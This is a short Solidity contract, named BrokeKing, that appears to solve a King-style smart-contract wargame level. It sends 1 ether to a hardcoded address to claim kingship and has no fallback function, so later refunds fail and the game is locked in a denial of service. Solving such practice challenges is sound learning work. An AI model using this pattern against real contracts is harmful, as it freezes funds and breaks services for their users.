// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract BrokeKing {
    address payable public king = 0xf2d90870b311e44B982FCEFB5716d9f9F2035f8E;

    constructor() public {}

    function get() external payable {}

    function broke() external {
        king.call.value(1000000000000000000).gas(4000000)("");
    }
}